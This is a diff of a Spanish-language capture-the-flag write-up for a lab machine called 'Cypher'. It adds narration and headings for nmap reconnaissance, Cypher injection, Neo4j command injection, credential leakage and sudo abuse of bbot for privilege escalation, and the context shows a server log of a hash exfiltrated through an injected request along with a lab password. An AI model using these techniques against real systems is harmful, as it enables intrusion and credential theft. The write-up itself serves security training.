@@ -23,7 +23,7 @@ layout:
 
 ## Reconnaissance
 
-
+Realizaremos un reconocimiento con `nmap` para ver los puertos que están expuestos en la máquina **`Cypher`**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.
 
 ```bash
 ❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.57 -oG allPorts
@@ -47,7 +47,7 @@ Nmap done: 1 IP address (1 host up) scanned in 22.26 seconds
            Raw packets sent: 66391 (2.921MB) | Rcvd: 66402 (2.657MB)
 ```
 
-
+A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.
 
 ```bash
 ❯ extractPorts allPorts
@@ -60,7 +60,7 @@ Nmap done: 1 IP address (1 host up) scanned in 22.26 seconds
 [*] Ports copied to clipboard
 ```
 
-
+Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX para posteriormente trabajar con ellos. En el resultado, comprobamos que se encuentran abierta una página web de `Nginx` y el servicio`SSH`.
 
 ```bash
 ❯ nmap -sCV -p22,80 10.10.11.57 -A -oN targeted -oX targetedXML
@@ -93,7 +93,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 15.04 seconds
 ```
 
-
+Transformaremos el archivo generado `targetedXML` para transformar el XML en un archivo HTML para posteriormente montar un servidor web y visualizarlo.
 
 ```bash
 ❯ xsltproc targetedXML > index.html
@@ -102,9 +102,11 @@ Nmap done: 1 IP address (1 host up) scanned in 15.04 seconds
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
+Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.
 
 <figure><img src="../../.gitbook/assets/imagen (462).png" alt=""><figcaption></figcaption></figure>
+
+## Web Enumeration
 
 
 
@@ -219,6 +221,10 @@ custom-apoc-extension-1.0-SNAPSHOT.jar             17-Feb-2025 11:49
 ===============================================================================
 ```
 
+## Initial Foothold
+
+### Analyzing a JAR File (JADX-GUI)
+
 
 
 ```bash
@@ -256,6 +262,10 @@ custom-apoc-extension-1.0-SNAPSHOT.jar                    100%[=================
 {% endcode %}
 
 
+
+
+
+### Cypher Injection on Login Panel
 
 
 
@@ -343,6 +353,10 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.129.111.76 - - [04/Mar/2025 17:22:55] "GET /?value=9f54ca4c130be6d529a56dee59dc2b2090e43acf HTTP/1.1" 200 -
 ```
+
+
+
+### Cracking Hashes (FAILED)
 
 
 
@@ -440,6 +454,8 @@ Started: Tue Mar  4 17:43:37 2025
 Stopped: Tue Mar  4 17:43:46 2025
 ```
 
+### Cypher Injection in Neo4j via a Vulnerable Java Procedure - Command Injection
+
 
 
 ```java
@@ -530,6 +546,12 @@ neo4j@cypher:/$ stty rows 46 columns 230
 
 
 
+## Initial Access
+
+### Information Leakage
+
+
+
 ```bash
 neo4j@cypher:/home/graphasm$ ls -l
 total 8
@@ -549,6 +571,8 @@ config:
       username: neo4j
       password: cU4btyib.20xtCMCXkBmerhK
 ```
+
+### Trying access on SSH with recently found password
 
 
 
@@ -584,7 +608,9 @@ graphasm@cypher:~$ cat user.txt
 965debffcc8f3c5f356ebeb9876a2947
 ```
 
+## Privilege Escalation
 
+### Abusing Sudoers Privilege (bbot)
 
 
 
@@ -725,6 +751,10 @@ EXAMPLES
 
 
 
+### **Reading Privileged Files via BBOT Exploitation through Sudo Privileges**
+
+
+
 {% embed url="https://www.blacklanternsecurity.com/bbot/Stable/modules/custom_yara_rules/" %}
 
 ```bash
@@ -853,6 +883,8 @@ www.blacklanternsecurity.com/bbot
 ```
 
 
+
+### Creating a New BBOT Module to Perform Remote Code Execution through Sudoers Privilege
 
 {% embed url="https://www.blacklanternsecurity.com/bbot/Stable/dev/module_howto/" %}
 
